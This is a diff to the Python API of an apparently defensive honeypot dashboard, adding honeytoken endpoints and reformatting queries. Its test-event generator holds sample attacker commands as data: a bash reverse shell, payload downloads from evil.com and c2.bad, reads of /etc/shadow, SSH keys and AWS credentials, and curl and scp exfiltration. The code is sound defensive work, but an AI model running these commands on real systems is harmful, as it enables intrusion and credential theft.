@@ -184,6 +184,7 @@ async def require_api_key(request: Request) -> None:
             detail="Rate limit exceeded — try again later",
         )
 
+
 # ── Global state ────────────────────────────────────
 nc = None
 db_pool = None
@@ -208,6 +209,7 @@ async def _cache_session(sid: str, data: dict) -> dict:
         while len(session_cache) > MAX_SESSION_CACHE:
             session_cache.popitem(last=False)  # evict oldest
         return session_cache[sid]
+
 
 # ── Helpers ─────────────────────────────────────────
 
@@ -250,7 +252,7 @@ def _json_field(val):
     """Parse a JSONB field that might be string or already-parsed."""
     if val is None:
         return []
-    if isinstance(val, (list, dict)):
+    if isinstance(val, list | dict):
         return val
     try:
         return json.loads(val)
@@ -263,12 +265,15 @@ MAX_MESSAGE_SIZE = 1_048_576  # 1 MB
 _oversized_messages = 0
 _oversized_lock = asyncio.Lock()
 
+
 async def nats_handler(msg):
     global _oversized_messages
     if len(msg.data) > MAX_MESSAGE_SIZE:
         async with _oversized_lock:
             _oversized_messages += 1
-        logger.warning(f"Truncating oversized NATS message: {len(msg.data)} bytes (total truncated: {_oversized_messages})")
+        logger.warning(
+            f"Truncating oversized NATS message: {len(msg.data)} bytes (total truncated: {_oversized_messages})"
+        )
     try:
         payload = json.loads(msg.data.decode())
         # Truncate large data fields to prevent memory issues
@@ -282,7 +287,7 @@ async def nats_handler(msg):
         payload = {"raw": msg.data.decode(errors="replace")}
 
     data = _parse_dict(payload.get("data"))
-    raw  = _parse_dict(payload.get("raw_data"))
+    raw = _parse_dict(payload.get("raw_data"))
 
     resolved_ip = (
         payload.get("source_ip")
@@ -361,7 +366,10 @@ async def lifespan(app: FastAPI):
 
     try:
         db_pool = await asyncpg.create_pool(
-            DB_DSN, min_size=5, max_size=25, timeout=10,
+            DB_DSN,
+            min_size=5,
+            max_size=25,
+            timeout=10,
             command_timeout=30,  # prevent queries from blocking indefinitely
         )
         async with db_pool.acquire() as conn:
@@ -499,9 +507,12 @@ async def get_stats():
     DB_QUERY_LATENCY.labels(query="stats").observe(time.time() - _start)
 
     return {
-        "total_sessions": s["total_sessions"], "active_sessions": s["active"],
-        "total_events": s["ev24"], "unique_ips": s["ips"],
-        "high_sev_24h": s["high24"], "honeytokens_triggered": s["ht"],
+        "total_sessions": s["total_sessions"],
+        "active_sessions": s["active"],
+        "total_events": s["ev24"],
+        "unique_ips": s["ips"],
+        "high_sev_24h": s["high24"],
+        "honeytokens_triggered": s["ht"],
         "kill_chains": s["kc"],
         "db_connected": True,
         "nats_connected": nc is not None and nc.is_connected,
@@ -526,7 +537,8 @@ async def get_sessions(limit: int = 50, offset: int = 0):
         """)
         total = total_row["total"] if total_row else 0
 
-        rows = await conn.fetch(f"""
+        rows = await conn.fetch(
+            f"""
             SELECT
                 session_id,
                 MAX(decoy_name) AS decoy_name,
@@ -553,7 +565,10 @@ async def get_sessions(limit: int = 50, offset: int = 0):
             GROUP BY session_id
             ORDER BY MAX(timestamp) DESC
             LIMIT $1 OFFSET $2
-        """, limit, offset)
+        """,
+            limit,
+            offset,
+        )
     DB_QUERY_LATENCY.labels(query="sessions").observe(time.time() - _start)
 
     # Batch-fetch MITRE techniques for all sessions in one query + one connection
@@ -563,7 +578,8 @@ async def get_sessions(limit: int = 50, offset: int = 0):
     if session_ids:
         try:
             async with db_pool.acquire() as conn:
-                tech_rows = await conn.fetch("""
+                tech_rows = await conn.fetch(
+                    """
                     SELECT DISTINCT session_id,
                            t->>'technique_id' AS tid,
                            t->>'technique_name' AS tname,
@@ -572,7 +588,9 @@ async def get_sessions(limit: int = 50, offset: int = 0):
                          jsonb_array_elements(mitre_techniques) AS t
                     WHERE session_id = ANY($1)
                       AND jsonb_array_length(mitre_techniques) > 0
-                """, session_ids)
+                """,
+                    session_ids,
+                )
                 for t in tech_rows:
                     techs_by_session.setdefault(t["session_id"], []).append(
                         {"technique_id": t["tid"], "technique_name": t["tname"], "tactic": t["tactic"]}
@@ -586,24 +604,31 @@ async def get_sessions(limit: int = 50, offset: int = 0):
         techs = techs_by_session.get(r["session_id"], [])
         tactics = list(set(t["tactic"] for t in techs if t.get("tactic")))
 
-        sessions.append({
-            "session_id": r["session_id"],
-            "decoy_name": r["decoy_name"],
-            "decoy_tier": r["decoy_tier"],
-            "source_ip": r["source_ip"],
-            "start_time": r["start_time"].isoformat() if r["start_time"] else None,
-            "end_time": r["end_time"].isoformat() if r["end_time"] else None,
-            "duration_seconds": r["duration_seconds"],
-            "auth_username": r["auth_username"],
-            "command_count": r["event_count"],
-            "max_severity": r["max_severity"],
-            "mitre_techniques": techs,
-            "attack_phases": tactics,
-            "kill_chain_detected": len(tactics) >= 3,
-        })
+        sessions.append(
+            {
+                "session_id": r["session_id"],
+                "decoy_name": r["decoy_name"],
+                "decoy_tier": r["decoy_tier"],
+                "source_ip": r["source_ip"],
+                "start_time": r["start_time"].isoformat() if r["start_time"] else None,
+                "end_time": r["end_time"].isoformat() if r["end_time"] else None,
+                "duration_seconds": r["duration_seconds"],
+                "auth_username": r["auth_username"],
+                "command_count": r["event_count"],
+                "max_severity": r["max_severity"],
+                "mitre_techniques": techs,
+                "attack_phases": tactics,
+                "kill_chain_detected": len(tactics) >= 3,
+            }
+        )
 
-    result = {"sessions": sessions, "offset": offset, "limit": limit, "total": total,
-              "techniques_available": not techniques_error}
+    result = {
+        "sessions": sessions,
+        "offset": offset,
+        "limit": limit,
+        "total": total,
+        "techniques_available": not techniques_error,
+    }
     return result
 
 
@@ -616,13 +641,17 @@ async def get_session_events(session_id: str, limit: int = 200, offset: int = 0)
         return JSONResponse({"events": [], "error": "DB not connected"}, status_code=503)
 
     async with db_pool.acquire() as conn:
-        total_row = await conn.fetchrow("""
+        total_row = await conn.fetchrow(
+            """
             SELECT COUNT(*) AS total FROM decoy_events
             WHERE session_id = $1 AND event_type != 'command.response'
-        """, session_id)
+        """,
+            session_id,
+        )
         total = total_row["total"] if total_row else 0
 
-        rows = await conn.fetch("""
+        rows = await conn.fetch(
+            """
             SELECT event_id, timestamp, event_type, severity,
                    source_ip::TEXT, source_port, raw_data,
                    mitre_techniques, tool_signatures, tags
@@ -631,7 +660,11 @@ async def get_session_events(session_id: str, limit: int = 200, offset: int = 0)
               AND event_type != 'command.response'
             ORDER BY timestamp ASC
             LIMIT $2 OFFSET $3
-        """, session_id, limit, offset)
+        """,
+            session_id,
+            limit,
+            offset,
+        )
 
     return {
         "session_id": session_id,
@@ -663,16 +696,20 @@ async def get_session_replay(session_id: str):
         return JSONResponse({"events": [], "error": "DB not connected"}, status_code=503)
 
     async with db_pool.acquire() as conn:
-        rows = await conn.fetch("""
+        rows = await conn.fetch(
+            """
             SELECT event_id, timestamp, event_type, severity,
                    source_ip::TEXT, source_port, raw_data,
                    mitre_techniques, tool_signatures, tags
             FROM decoy_events
             WHERE session_id = $1
             ORDER BY timestamp ASC, event_type ASC
-        """, session_id)
+        """,
+            session_id,
+        )
 
-        summary_row = await conn.fetchrow("""
+        summary_row = await conn.fetchrow(
+            """
             SELECT
                 MIN(timestamp) AS start_time,
                 MAX(timestamp) AS end_time,
@@ -685,9 +722,12 @@ async def get_session_replay(session_id: str):
                 COALESCE(MAX(raw_data->>'username'), MAX(raw_data->'data'->>'username')) AS username
             FROM decoy_events
             WHERE session_id = $1
-        """, session_id)
+        """,
+            session_id,
+        )
 
-        tech_rows = await conn.fetch("""
+        tech_rows = await conn.fetch(
+            """
             SELECT DISTINCT t->>'technique_id' AS tid,
                    t->>'technique_name' AS tname,
                    t->>'tactic' AS tactic
@@ -695,7 +735,9 @@ async def get_session_replay(session_id: str):
                  jsonb_array_elements(mitre_techniques) AS t
             WHERE session_id = $1
               AND jsonb_array_length(mitre_techniques) > 0
-        """, session_id)
+        """,
+            session_id,
+        )
 
     events = []
     prev_ts = None
@@ -705,19 +747,21 @@ async def get_session_replay(session_id: str):
         delta_ms = int((ts - prev_ts).total_seconds() * 1000) if prev_ts else None
         prev_ts = ts
 
-        events.append({
-            "event_id": r["event_id"],
-            "timestamp": ts.isoformat(),
-            "event_type": r["event_type"],
-            "severity": r["severity"],
-            "source_ip": r["source_ip"],
-            "command": raw.get("command", raw.get("input", "")),
-            "response": raw.get("response", raw.get("output", "")),
-            "raw_data": raw,
-            "mitre_techniques": _json_field(r["mitre_techniques"]),
-            "tool_signatures": _json_field(r["tool_signatures"]),
-            "delta_ms": delta_ms,
-        })
+        events.append(
+            {
+                "event_id": r["event_id"],
+                "timestamp": ts.isoformat(),
+                "event_type": r["event_type"],
+                "severity": r["severity"],
+                "source_ip": r["source_ip"],
+                "command": raw.get("command", raw.get("input", "")),
+                "response": raw.get("response", raw.get("output", "")),
+                "raw_data": raw,
+                "mitre_techniques": _json_field(r["mitre_techniques"]),
+                "tool_signatures": _json_field(r["tool_signatures"]),
+                "delta_ms": delta_ms,
+            }
+        )
 
     techs = [{"technique_id": t["tid"], "technique_name": t["tname"], "tactic": t["tactic"]} for t in tech_rows]
     tactics = list(set(t["tactic"] for t in techs if t.get("tactic")))
@@ -761,25 +805,32 @@ async def get_events(limit: int = 100, offset: int = 0, severity: str = None):
                 severity,
             )
             total = total_row["total"] if total_row else 0
-            rows = await conn.fetch("""
+            rows = await conn.fetch(
+                """
                 SELECT event_id, timestamp, decoy_name, event_type,
                        source_ip::TEXT, severity, raw_data, mitre_techniques
                 FROM decoy_events
                 WHERE severity = $1
                 ORDER BY timestamp DESC LIMIT $2 OFFSET $3
-            """, severity, limit, offset)
+            """,
+                severity,
+                limit,
+                offset,
+            )
     else:
         async with db_pool.acquire() as conn:
-            total_row = await conn.fetchrow(
-                "SELECT COUNT(*) AS total FROM decoy_events"
-            )
+            total_row = await conn.fetchrow("SELECT COUNT(*) AS total FROM decoy_events")
             total = total_row["total"] if total_row else 0
-            rows = await conn.fetch("""
+            rows = await conn.fetch(
+                """
                 SELECT event_id, timestamp, decoy_name, event_type,
                        source_ip::TEXT, severity, raw_data, mitre_techniques
                 FROM decoy_events
                 ORDER BY timestamp DESC LIMIT $1 OFFSET $2
-            """, limit, offset)
+            """,
+                limit,
+                offset,
+            )
     DB_QUERY_LATENCY.labels(query="events").observe(time.time() - _start)
 
     return {
@@ -799,6 +850,118 @@ async def get_events(limit: int = 100, offset: int = 0, severity: str = None):
         "offset": offset,
         "limit": limit,
         "total": total,
+    }
+
+
+# ── REST: Honeytokens ───────────────────────────────
+@app.get("/api/honeytokens", dependencies=[Depends(require_api_key)])
+async def get_honeytokens(limit: int = 50, offset: int = 0):
+    """Honeytoken trigger events with per-token aggregation."""
+    limit = max(1, min(limit, 1000))
+    offset = max(0, offset)
+    if not db_pool:
+        return JSONResponse({"honeytokens": [], "error": "DB not connected"}, status_code=503)
+
+    _start = time.time()
+    async with db_pool.acquire() as conn:
+        total_row = await conn.fetchrow("""
+            SELECT COUNT(DISTINCT raw_data->>'token_name') AS total
+            FROM decoy_events
+            WHERE event_type LIKE 'honeytoken.%'
+        """)
+        total = total_row["total"] if total_row else 0
+
+        rows = await conn.fetch(
+            """
+            SELECT
+                raw_data->>'token_name' AS token_name,
+                raw_data->>'token_type' AS token_type,
+                raw_data->>'accessed_path' AS path,
+                raw_data->>'access_vector' AS last_access_vector,
+                decoy_name,
+                COUNT(*) AS trigger_count,
+                MAX(timestamp) AS last_triggered,
+                MIN(timestamp) AS first_triggered,
+                COUNT(DISTINCT source_ip) AS unique_ips,
+                COUNT(DISTINCT session_id) AS unique_sessions,
+                array_agg(DISTINCT source_ip::text ORDER BY source_ip::text) AS source_ips
+            FROM decoy_events
+            WHERE event_type LIKE 'honeytoken.%'
+            GROUP BY token_name, token_type, path, last_access_vector, decoy_name
+            ORDER BY last_triggered DESC
+            LIMIT $1 OFFSET $2
+        """,
+            limit,
+            offset,
+        )
+    DB_QUERY_LATENCY.labels(query="honeytokens").observe(time.time() - _start)
+
+    return {
+        "honeytokens": [
+            {
+                "token_name": r["token_name"],
+                "token_type": r["token_type"],
+                "path": r["path"],
+                "decoy_name": r["decoy_name"],
+                "trigger_count": r["trigger_count"],
+                "unique_ips": r["unique_ips"],
+                "unique_sessions": r["unique_sessions"],
+                "last_triggered": r["last_triggered"].isoformat() if r["last_triggered"] else None,
+                "first_triggered": r["first_triggered"].isoformat() if r["first_triggered"] else None,
+                "last_access_vector": r["last_access_vector"],
+                "source_ips": r["source_ips"] or [],
+            }
+            for r in rows
+        ],
+        "offset": offset,
+        "limit": limit,
+        "total": total,
+    }
+
+
+@app.get("/api/honeytokens/{token_name}/events", dependencies=[Depends(require_api_key)])
+async def get_honeytoken_events(token_name: str, limit: int = 50, offset: int = 0):
+    """Trigger history for a specific honeytoken."""
+    limit = max(1, min(limit, 500))
+    offset = max(0, offset)
+    if not db_pool:
+        return JSONResponse({"events": [], "error": "DB not connected"}, status_code=503)
+
+    _start = time.time()
+    async with db_pool.acquire() as conn:
+        rows = await conn.fetch(
+            """
+            SELECT
+                event_id, timestamp, decoy_name, session_id,
+                event_type, source_ip, severity, raw_data
+            FROM decoy_events
+            WHERE event_type LIKE 'honeytoken.%'
+              AND raw_data->>'token_name' = $1
+            ORDER BY timestamp DESC
+            LIMIT $2 OFFSET $3
+        """,
+            token_name,
+            limit,
+            offset,
+        )
+    DB_QUERY_LATENCY.labels(query="honeytoken_events").observe(time.time() - _start)
+
+    return {
+        "events": [
+            {
+                "event_id": str(r["event_id"]),
+                "timestamp": r["timestamp"].isoformat(),
+                "decoy_name": r["decoy_name"],
+                "session_id": r["session_id"],
+                "event_type": r["event_type"],
+                "source_ip": str(r["source_ip"]) if r["source_ip"] else None,
+                "severity": r["severity"],
+                "data": _parse_raw(r["raw_data"]),
+            }
+            for r in rows
+        ],
+        "offset": offset,
+        "limit": limit,
     }
 
 
@@ -822,7 +985,8 @@ async def get_mitre_summary(limit: int = 30, offset: int = 0):
         """)
         total_count = total_row["total"] if total_row else 0
 
-        rows = await conn.fetch("""
+        rows = await conn.fetch(
+            """
             SELECT
                 t.tech->>'technique_id' AS technique_id,
                 t.tech->>'technique_name' AS technique_name,
@@ -838,7 +1002,10 @@ async def get_mitre_summary(limit: int = 30, offset: int = 0):
                      t.tech->>'tactic'
             ORDER BY total DESC
             LIMIT $1 OFFSET $2
-        """, limit, offset)
+        """,
+            limit,
+            offset,
+        )
 
     return {
         "techniques": [
@@ -860,12 +1027,18 @@ async def get_mitre_summary(limit: int = 30, offset: int = 0):
 
 # ── REST: Engage Effectiveness ──────────────────────
 TACTIC_TO_ENGAGE = {
-    "discovery": "EAC0004 — Pocket Litter", "credential-access": "EAC0005 — Lure",
-    "lateral-movement": "EAC0014 — Network Manipulation", "execution": "EAC0006 — Behavioral Analytics",
-    "persistence": "EAC0021 — Monitoring", "exfiltration": "EAC0003 — Burn Notice",
-    "collection": "EAC0004 — Pocket Litter", "command-and-control": "EAC0014 — Network Manipulation",
-    "privilege-escalation": "EAC0006 — Behavioral Analytics", "impact": "EAC0003 — Burn Notice",
-    "defense-evasion": "EAC0006 — Behavioral Analytics", "initial-access": "EAC0005 — Lure",
+    "discovery": "EAC0004 — Pocket Litter",
+    "credential-access": "EAC0005 — Lure",
+    "lateral-movement": "EAC0014 — Network Manipulation",
+    "execution": "EAC0006 — Behavioral Analytics",
+    "persistence": "EAC0021 — Monitoring",
+    "exfiltration": "EAC0003 — Burn Notice",
+    "collection": "EAC0004 — Pocket Litter",
+    "command-and-control": "EAC0014 — Network Manipulation",
+    "privilege-escalation": "EAC0006 — Behavioral Analytics",
+    "impact": "EAC0003 — Burn Notice",
+    "defense-evasion": "EAC0006 — Behavioral Analytics",
+    "initial-access": "EAC0005 — Lure",
     "reconnaissance": "EAC0004 — Pocket Litter",
 }
 
@@ -878,7 +1051,8 @@ async def get_engage(limit: int = 100, offset: int = 0):
         return JSONResponse({"engage": [], "error": "DB not connected"}, status_code=503)
 
     async with db_pool.acquire() as conn:
-        rows = await conn.fetch("""
+        rows = await conn.fetch(
+            """
             WITH session_tactics AS (
                 -- aggregate distinct tactics per session (pre-computed once)
                 SELECT e.session_id,
@@ -913,7 +1087,10 @@ async def get_engage(limit: int = 100, offset: int = 0):
             WHERE e.timestamp > NOW() - INTERVAL '7 days'
             GROUP BY t.tech->>'technique_id', t.tech->>'technique_name', t.tech->>'tactic'
             ORDER BY times_observed DESC LIMIT $1 OFFSET $2
-        """, limit, offset)
+        """,
+            limit,
+            offset,
+        )
 
     engage = []
     for r in rows:
@@ -921,12 +1098,16 @@ async def get_engage(limit: int = 100, offset: int = 0):
         activity = TACTIC_TO_ENGAGE.get(tactic, "EAC0021 — Monitoring")
         dur = float(r["avg_dur"]) if r["avg_dur"] else 0
         eff = min(1.0, (dur / 300) * 0.5 + (r["kill_chains"] / max(r["sessions"], 1)) * 0.5)
-        engage.append({
-            "technique_id": r["tid"], "technique_name": r["tname"],
-            "engage_activity": activity, "times_observed": r["times_observed"],
-            "effectiveness": round(eff, 2),
-            "last_seen": r["last_seen"].isoformat() if r["last_seen"] else None,
-        })
+        engage.append(
+            {
+                "technique_id": r["tid"],
+                "technique_name": r["tname"],
+                "engage_activity": activity,
+                "times_observed": r["times_observed"],
+                "effectiveness": round(eff, 2),
+                "last_seen": r["last_seen"].isoformat() if r["last_seen"] else None,
+            }
+        )
     return {"engage": engage, "offset": offset, "limit": limit}
 
 
@@ -939,23 +1120,37 @@ async def get_top_ips(hours: int = 24, limit: int = 15):
         return JSONResponse({"ips": [], "error": "DB not connected"}, status_code=503)
     _start = time.time()
     async with db_pool.acquire() as conn:
-        rows = await conn.fetch(f"""
+        rows = await conn.fetch(
+            f"""
             SELECT source_ip::TEXT, COUNT(*) AS events,
                    MAX(severity) AS max_severity, COUNT(DISTINCT session_id) AS sessions
             FROM decoy_events
             WHERE timestamp > NOW() - make_interval(hours => $1) AND {_routable_ip_filter()}
             GROUP BY source_ip ORDER BY events DESC LIMIT $2
-        """, hours, limit)
+        """,
+            hours,
+            limit,
+        )
     DB_QUERY_LATENCY.labels(query="top_ips").observe(time.time() - _start)
     return {"ips": [dict(r) for r in rows]}
 
 
 # ── REST: Kill Chain Timelines ─────────────────────
 PHASE_ORDER = [
-    "reconnaissance", "resource-development", "initial-access", "execution",
-    "persistence", "privilege-escalation", "defense-evasion", "credential-access",
-    "discovery", "lateral-movement", "collection", "command-and-control",
-    "exfiltration", "impact",
+    "reconnaissance",
+    "resource-development",
+    "initial-access",
+    "execution",
+    "persistence",
+    "privilege-escalation",
+    "defense-evasion",
+    "credential-access",
+    "discovery",
+    "lateral-movement",
+    "collection",
+    "command-and-control",
+    "exfiltration",
+    "impact",
 ]
 
 
@@ -968,7 +1163,8 @@ async def get_kill_chains(limit: int = 20, offset: int = 0):
 
     _start = time.time()
     async with db_pool.acquire() as conn:
-        rows = await conn.fetch(f"""
+        rows = await conn.fetch(
+            f"""
             SELECT e.session_id, MAX(e.source_ip)::TEXT AS source_ip,
                 MAX(e.decoy_name) AS decoy_name, MAX(e.raw_data->>'username') AS auth_username,
                 EXTRACT(EPOCH FROM MAX(e.timestamp) - MIN(e.timestamp))::INT AS duration_seconds,
@@ -981,7 +1177,10 @@ async def get_kill_chains(limit: int = 20, offset: int = 0):
             WHERE {_routable_ip_filter('e.source_ip')}
             GROUP BY e.session_id HAVING COUNT(DISTINCT (t.tech->>'tactic')) >= 3
             ORDER BY MIN(e.timestamp) DESC LIMIT $1 OFFSET $2
-        """, limit, offset)
+        """,
+            limit,
+            offset,
+        )
     DB_QUERY_LATENCY.labels(query="kill_chains").observe(time.time() - _start)
 
     results = []
@@ -992,24 +1191,41 @@ async def get_kill_chains(limit: int = 20, offset: int = 0):
         for phase in PHASE_ORDER:
             if phase in phases_raw:
                 techs_in_phase = [t for t in techniques if isinstance(t, dict) and t.get("tactic") == phase]
-                phase_details.append({
-                    "phase": phase, "index": PHASE_ORDER.index(phase),
-                    "techniques": [{"id": t.get("technique_id", ""), "name": t.get("technique_name", "")} for t in techs_in_phase],
-                })
-        results.append({
-            "session_id": r["session_id"], "source_ip": r["source_ip"],
-            "auth_username": r["auth_username"], "decoy_name": r["decoy_name"],
-            "duration_seconds": r["duration_seconds"], "command_count": r["command_count"],
-            "start_time": r["start_time"].isoformat() if r["start_time"] else None,
-            "phase_count": len(phase_details), "phases": phase_details,
-        })
+                phase_details.append(
+                    {
+                        "phase": phase,
+                        "index": PHASE_ORDER.index(phase),
+                        "techniques": [
+                            {"id": t.get("technique_id", ""), "name": t.get("technique_name", "")}
+                            for t in techs_in_phase
+                        ],
+                    }
+                )
+        results.append(
+            {
+                "session_id": r["session_id"],
+                "source_ip": r["source_ip"],
+                "auth_username": r["auth_username"],
+                "decoy_name": r["decoy_name"],
+                "duration_seconds": r["duration_seconds"],
+                "command_count": r["command_count"],
+                "start_time": r["start_time"].isoformat() if r["start_time"] else None,
+                "phase_count": len(phase_details),
+                "phases": phase_details,
+            }
+        )
     return {"sessions": results}
 
 
 # ── REST: Duration Histogram ───────────────────────
 DURATION_BUCKETS = [
-    ("0-10s", 0, 10), ("10-30s", 10, 30), ("30s-1m", 30, 60),
-    ("1-5m", 60, 300), ("5-15m", 300, 900), ("15-60m", 900, 3600), ("60m+", 3600, None),
+    ("0-10s", 0, 10),
+    ("10-30s", 10, 30),
+    ("30s-1m", 30, 60),
+    ("1-5m", 60, 300),
+    ("5-15m", 300, 900),
+    ("15-60m", 900, 3600),
+    ("60m+", 3600, None),
 ]
 
 
@@ -1032,7 +1248,12 @@ async def get_duration_histogram():
     total = len(durations)
     avg = sum(durations) / total if total > 0 else 0
     median = sorted(durations)[total // 2] if total > 0 else 0
-    return {"buckets": buckets, "total_sessions": total, "avg_seconds": round(avg, 1), "median_seconds": round(median, 1)}
+    return {
+        "buckets": buckets,
+        "total_sessions": total,
+        "avg_seconds": round(avg, 1),
+        "median_seconds": round(median, 1),
+    }
 
 
 # ── REST: Geographic Breakdown ─────────────────────
@@ -1042,7 +1263,8 @@ async def get_geo_breakdown(hours: int = 168):
     if not db_pool:
         return JSONResponse({"countries": [], "error": "DB not connected"}, status_code=503)
     async with db_pool.acquire() as conn:
-        rows = await conn.fetch(f"""
+        rows = await conn.fetch(
+            f"""
             SELECT e.geo->>'country' AS country_code, e.geo->>'country_name' AS country_name,
                 COUNT(DISTINCT e.session_id) AS sessions, COUNT(DISTINCT e.source_ip::TEXT) AS unique_ips,
                 SUM(CASE WHEN e.event_type IN ('command.exec','command') THEN 1 ELSE 0 END) AS total_commands,
@@ -1052,15 +1274,21 @@ async def get_geo_breakdown(hours: int = 168):
             WHERE e.geo IS NOT NULL AND e.geo->>'country' IS NOT NULL
               AND {_routable_ip_filter('e.source_ip')} AND e.timestamp > NOW() - make_interval(hours => $1)
             GROUP BY e.geo->>'country', e.geo->>'country_name' ORDER BY sessions DESC
-        """, hours)
+        """,
+            hours,
+        )
     return {
-        "countries": [{
-            "country_code": r["country_code"],
-            "country_name": r["country_name"] or r["country_code"],
-            "sessions": r["sessions"], "unique_ips": r["unique_ips"],
-            "total_commands": r["total_commands"] or 0,
-            "avg_duration": round(float(r["avg_duration"]), 1) if r["avg_duration"] else 0,
-        } for r in rows],
+        "countries": [
+            {
+                "country_code": r["country_code"],
+                "country_name": r["country_name"] or r["country_code"],
+                "sessions": r["sessions"],
+                "unique_ips": r["unique_ips"],
+                "total_commands": r["total_commands"] or 0,
+                "avg_duration": round(float(r["avg_duration"]), 1) if r["avg_duration"] else 0,
+            }
+            for r in rows
+        ],
         "period_hours": hours,
     }
 
@@ -1070,16 +1298,41 @@ async def get_geo_breakdown(hours: int = 168):
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 RECON_COMMANDS = ["whoami", "id", "uname -a", "hostname", "w", "last"]
-DISCOVERY_COMMANDS = ["cat /etc/passwd", "ls -la /root", "ps aux", "netstat -tlnp", "ifconfig", "cat /proc/version", "find / -name '*.pem' 2>/dev/null", "df -h", "env"]
+DISCOVERY_COMMANDS = [
+    "cat /etc/passwd",
+    "ls -la /root",
+    "ps aux",
+    "netstat -tlnp",
+    "ifconfig",
+    "cat /proc/version",
+    "find / -name '*.pem' 2>/dev/null",
+    "df -h",
+    "env",
+]
 CREDENTIAL_COMMANDS = ["cat /etc/shadow", "cat ~/.ssh/id_rsa", "cat ~/.ssh/authorized_keys", "cat ~/.aws/credentials"]
 LATERAL_COMMANDS = ["ssh root@10.0.0.5", "ssh admin@192.168.1.10", "scp /tmp/data.tgz user@10.0.0.8:/tmp/"]
-PERSIST_COMMANDS = ["crontab -e", "echo '* * * * * /tmp/s' >> /var/spool/cron/root", "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"]
+PERSIST_COMMANDS = [
+    "crontab -e",
+    "echo '* * * * * /tmp/s' >> /var/spool/cron/root",
+    "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
+]
 C2_COMMANDS = ["wget http://evil.com/payload.sh", "curl http://c2.bad/s -o /tmp/s", "chmod +x /tmp/s"]
 EXEC_COMMANDS = ["/tmp/s -p 4444", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "python3 -c 'import socket; ...'"]
 COLLECTION_COMMANDS = ["tar czf /tmp/data.tgz /etc", "tar czf /tmp/keys.tgz ~/.ssh", "zip -r /tmp/www.zip /var/www"]
 EXFIL_COMMANDS = ["scp /tmp/data.tgz attacker@c2.bad:/loot/", "curl -X POST http://c2.bad/exfil -d @/tmp/data.tgz"]
 EVASION_COMMANDS = ["unset HISTFILE", "history -c", "rm -f ~/.bash_history", "iptables -F"]
-ATTACK_PHASES = [RECON_COMMANDS, DISCOVERY_COMMANDS, CREDENTIAL_COMMANDS, C2_COMMANDS, EXEC_COMMANDS, LATERAL_COMMANDS, PERSIST_COMMANDS, COLLECTION_COMMANDS, EXFIL_COMMANDS, EVASION_COMMANDS]
+ATTACK_PHASES = [
+    RECON_COMMANDS,
+    DISCOVERY_COMMANDS,
+    CREDENTIAL_COMMANDS,
+    C2_COMMANDS,
+    EXEC_COMMANDS,
+    LATERAL_COMMANDS,
+    PERSIST_COMMANDS,
+    COLLECTION_COMMANDS,
+    EXFIL_COMMANDS,
+    EVASION_COMMANDS,
+]
 
 SAMPLE_GEOS = [
     {"country": "CN", "country_name": "China", "city": "Beijing", "latitude": 39.9, "longitude": 116.4},
@@ -1102,21 +1355,46 @@ def _make_raw_event(event_type, session_id, src_ip, username, decoy_name, ts, co
         data["command"] = command
         data["response"] = "..."
     return {
-        "event_id": event_id, "timestamp": ts.isoformat(), "decoy_name": decoy_name,
-        "decoy_tier": 2, "session_id": session_id, "event_type": event_type,
-        "source_ip": src_ip, "source_port": random.randint(40000, 65000),
-        "data": data, "raw_data": data, "geo": geo or random.choice(SAMPLE_GEOS),
+        "event_id": event_id,
+        "timestamp": ts.isoformat(),
+        "decoy_name": decoy_name,
+        "decoy_tier": 2,
+        "session_id": session_id,
+        "event_type": event_type,
+        "source_ip": src_ip,
+        "source_port": random.randint(40000, 65000),
+        "data": data,
+        "raw_data": data,
+        "geo": geo or random.choice(SAMPLE_GEOS),
     }
 
 
 if not os.getenv("DASHBOARD_DISABLE_TEST_ENDPOINTS"):
+
     @app.post("/api/test/inject", dependencies=[Depends(require_api_key)])
     async def inject_test_event():
-        all_commands = RECON_COMMANDS + DISCOVERY_COMMANDS + CREDENTIAL_COMMANDS + LATERAL_COMMANDS + C2_COMMANDS + EXEC_COMMANDS + COLLECTION_COMMANDS + EVASION_COMMANDS
+        all_commands = (
+            RECON_COMMANDS
+            + DISCOVERY_COMMANDS
+            + CREDENTIAL_COMMANDS
+            + LATERAL_COMMANDS
+            + C2_COMMANDS
+            + EXEC_COMMANDS
+            + COLLECTION_COMMANDS
+            + EVASION_COMMANDS
+        )
         cmd = random.choice(all_commands)
         src_ip = f"{random.choice([198,203,45,91,185])}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
         username = random.choice(["root", "admin", "deploy", "ubuntu"])
-        event = _make_raw_event("command.exec", f"sess-{random.randint(1000,9999)}", src_ip, username, random.choice(["ssh-decoy-01", "ssh-decoy-02"]), datetime.now(UTC), cmd)
+        event = _make_raw_event(
+            "command.exec",
+            f"sess-{random.randint(1000,9999)}",
+            src_ip,
+            username,
+            random.choice(["ssh-decoy-01", "ssh-decoy-02"]),
+            datetime.now(UTC),
+            cmd,
+        )
         subject = f"cicdecoy.decoy.events.{event['event_type']}"
         if nc and nc.is_connected:
             await nc.publish(subject, json.dumps(event).encode())
@@ -1143,14 +1421,59 @@ if not os.getenv("DASHBOARD_DISABLE_TEST_ENDPOINTS"):
             commands.append(random.choice(random.choice(ATTACK_PHASES)))
         elapsed = 0
         try:
-            await nc.publish("cicdecoy.decoy.events.connection.new", json.dumps(_make_raw_event("connection.new", session_id, src_ip, username, decoy_name, now, geo=geo)).encode())
+            await nc.publish(
+                "cicdecoy.decoy.events.connection.new",
+                json.dumps(
+                    _make_raw_event("connection.new", session_id, src_ip, username, decoy_name, now, geo=geo)
+                ).encode(),
+            )
             elapsed += random.randint(1, 3)
-            await nc.publish("cicdecoy.decoy.events.auth.success", json.dumps(_make_raw_event("auth.success", session_id, src_ip, username, decoy_name, now + timedelta(seconds=elapsed), geo=geo)).encode())
+            await nc.publish(
+                "cicdecoy.decoy.events.auth.success",
+                json.dumps(
+                    _make_raw_event(
+                        "auth.success",
+                        session_id,
+                        src_ip,
+                        username,
+                        decoy_name,
+                        now + timedelta(seconds=elapsed),
+                        geo=geo,
+                    )
+                ).encode(),
+            )
             for cmd in commands:
                 elapsed += random.randint(2, 20)
-                await nc.publish("cicdecoy.decoy.events.command.exec", json.dumps(_make_raw_event("command.exec", session_id, src_ip, username, decoy_name, now + timedelta(seconds=elapsed), cmd, geo)).encode())
+                await nc.publish(
